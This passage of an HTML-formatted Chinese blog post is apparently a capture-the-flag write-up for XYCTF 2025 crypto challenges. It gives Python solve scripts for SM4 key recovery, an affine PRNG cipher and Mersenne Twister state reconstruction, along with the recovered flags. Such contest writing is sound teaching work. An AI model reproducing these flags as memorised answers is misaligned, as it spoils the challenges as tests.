class=\"token keyword\">elif</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>coeff_part<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'+1'</span> <span class=\"token keyword\">or</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> terms\n\n<span class=\"token comment\"># 解密函数</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">sm4_decrypt</span><span class=\"token punctuation\">(</span>key_hex<span class=\"token punctuation\">,</span> ciphertext_hex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    key <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>unhexlify<span class=\"token punctuation\">(</span>key_hex<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    cipher <span class=\"token operator\">=</span> sm4<span class=\"token punctuation\">.</span>CryptSM4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    cipher<span class=\"token punctuation\">.</span>set_key<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> sm4<span class=\"token punctuation\">.</span>SM4_DECRYPT<span class=\"token punctuation\">)</span>\n    ciphertext <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>unhexlify<span class=\"token punctuation\">(</span>ciphertext_hex<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span>\n    plaintext <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">.</span>crypt_ecb<span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> plaintext\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">sm4_encrypt</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> plaintext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"SM4 key must be 16 bytes\"</span>\n    cipher <span class=\"token operator\">=</span> sm4<span class=\"token punctuation\">.</span>CryptSM4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    cipher<span class=\"token punctuation\">.</span>set_key<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> sm4<span class=\"token punctuation\">.</span>SM4_ENCRYPT<span class=\"token punctuation\">)</span>\n    padded_plaintext <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> cipher<span class=\"token punctuation\">.</span>crypt_ecb<span class=\"token punctuation\">(</span>padded_plaintext<span class=\"token punctuation\">)</span>\n\n\nm<span class=\"token operator\">=</span><span class=\"token string\">\"-x^48 - x^46 + x^45 + x^43 - x^42 + x^41 + x^40 + x^36 - x^35 + x^34 - x^33 + x^32 - x^30 + x^29 - x^28 - x^27 - x^26 - x^25 - x^23 - x^22 + x^21 + x^20 + x^19 + x^18 - x^17 - x^16 - x^15 - x^14 - x^12 + x^9 - x^7 - x^6 - x^5 - x^4 + x^3 - x + 1\"</span>\nm_ <span class=\"token operator\">=</span> terms<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m_<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">gen_key</span><span class=\"token punctuation\">(</span>poly_terms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    binary <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">128</span>\n    <span class=\"token keyword\">for</span> term <span class=\"token keyword\">in</span> poly_terms<span class=\"token punctuation\">:</span>\n        exponent <span class=\"token operator\">=</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>term<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> term <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> exponent <span class=\"token operator\">&lt;=</span> <span class=\"token number\">127</span><span class=\"token punctuation\">:</span>  \n            binary<span class=\"token punctuation\">[</span><span class=\"token number\">127</span> <span class=\"token operator\">-</span> exponent<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    binary_str <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> binary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    hex_key <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>binary_str<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> hex_key\n\nhex_key <span class=\"token operator\">=</span> gen_key<span class=\"token punctuation\">(</span>m_<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>hex_key<span class=\"token punctuation\">)</span>\n\nencrypted_flag <span class=\"token operator\">=</span> <span class=\"token string\">\"bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835\"</span>\nflag <span class=\"token operator\">=</span> sm4_decrypt<span class=\"token punctuation\">(</span>hex_key<span class=\"token punctuation\">,</span> encrypted_flag<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Decrypted Flag:\"</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span></code></pre>\n\n<p>XYCTF{Crypto0_can_n0t_So1ve_it}</p>\n<h3 id=\"reed\"><a href=\"#reed\" class=\"headerlink\" title=\"reed\"></a>reed</h3><p>题目给出一个基于random的随机数生成器</p>\n<p>但是观察密文前两组是一样的，是同一个字符，根据出题人给出的其他参数，推测flag前几位是114514</p>\n<p>有两个不一样的m即可两组enc相减乘m差值的逆元获得a，即可获得a，b。解密即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> string\n<span class=\"token keyword\">import</span> random\n\ntable <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits\n\nr <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">PRNG</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> seed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">1145140</span>\n        self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">=</span> <span class=\"token number\">19198100</span>\n        random<span class=\"token punctuation\">.</span>seed<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        x <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span>\n        random<span class=\"token punctuation\">.</span>seed<span class=\"token punctuation\">(</span>x <span class=\"token operator\">**</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> x\n    \n    <span class=\"token keyword\">def</span> <span class=\"token function\">round</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            x <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> x\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">*</span> table<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">19198111</span> <span class=\"token keyword\">for</span> m <span class=\"token keyword\">in</span> msg<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> c\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nenc<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9474070</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15547185</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9474070</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6914981</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5936215</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1042385</span><span class=\"token punctuation\">,</span> <span class=\"token number\">841866</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13966862</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10051798</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3978683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5936215</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17103679</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15146147</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5936215</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9073032</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9073032</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3978683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13966862</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14945628</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17103679</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12988096</span><span class=\"token punctuation\">,</span> <span class=\"token number\">841866</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2999917</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3978683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2021151</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9073032</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1443423</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1443423</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14568419</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4379721</span><span class=\"token punctuation\">]</span>\n\nprng <span class=\"token operator\">=</span> PRNG<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\nflag<span class=\"token operator\">=</span><span class=\"token string\">'114'</span>\n\nencc<span class=\"token operator\">=</span>enc<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>enc<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\ninv_e<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>table<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">19198111</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>inv_e<span class=\"token punctuation\">)</span>\n\namod<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>enc<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inv_e<span class=\"token operator\">%</span><span class=\"token number\">19198111</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>amod<span class=\"token punctuation\">)</span>\ninv_a<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>amod<span class=\"token punctuation\">,</span><span class=\"token number\">19198111</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>inv_a<span class=\"token punctuation\">)</span>\nb<span class=\"token operator\">=</span>enc<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>amod<span class=\"token operator\">*</span>table<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">19198111</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> enc<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">-</span>b<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inv_a<span class=\"token operator\">%</span><span class=\"token number\">19198111</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n\n\n</code></pre>\n\n<p>114514fixedpointissodangerous1919810</p>\n<h3 id=\"choice\"><a href=\"#choice\" class=\"headerlink\" title=\"choice\"></a>choice</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> bytes_to_long\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> Random\n<span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag\n\n<span class=\"token keyword\">assert</span> flag<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">b'XYCTF&#123;'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> flag<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span><span class=\"token string\">b'&#125;'</span><span class=\"token punctuation\">)</span>\nflag <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n\nmsg <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\nrand <span class=\"token operator\">=</span> Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ntest <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'output.py'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'enc = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>msg <span class=\"token operator\">^</span> rand<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\nr = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">[</span>rand<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2496</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>给了2496组choice()，查看源码发现和getrandbits(8)相当，根据索引构建矩阵求解即可复原state，使用extend_mt19937_predictor溯源即可</p>\n<p>m长度可能与e有偏差，多试两位即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/mnt/e/wenjian/p/timu/xyCTF/2025/choice/output.py\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    e<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token operator\">=</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\ntest <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\nDall<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">:</span>\n    Dall<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Dall<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>Dall<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nn<span class=\"token operator\">=</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>Dall<span class=\"token punctuation\">)</span>\nD<span class=\"token operator\">=</span>Dall\nrng<span class=\"token operator\">=</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">getRows</span><span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\">#这一部分根据题目实际编写，必须和题目实际比特获取顺序和方式完全一致，且确保比特数大于19937，并且请注意zfill。</span>\n    row<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        row<span class=\"token operator\">+=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> row\nM<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">19968</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#这一部分为固定套路，具体原因已经写在注释中了</span>\n\n    state <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">624</span>\n    temp <span class=\"token operator\">=</span> <span class=\"token string\">\"0\"</span><span class=\"token operator\">*</span>i <span class=\"token operator\">+</span> <span class=\"token string\">\"1\"</span><span class=\"token operator\">*</span><span class=\"token number\">1</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"0\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">19968</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        state<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>j<span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>j<span class=\"token operator\">+</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    rng<span class=\"token punctuation\">.</span>setstate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>state<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token number\">624</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#这个setstate也是固定格式，已于2025.1.21测试</span>\n    M<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>getRows<span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\nM<span class=\"token operator\">=</span>Matrix<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>M<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>M<span class=\"token punctuation\">.</span>rank<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\ny<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    y<span class=\"token operator\">+=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>D<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------------------------------------------------------------------------------'</span><span class=\"token punctuation\">)</span>\n\ny<span class=\"token operator\">=</span>vector<span class=\"token punctuation\">(</span>GF<span class=\"token 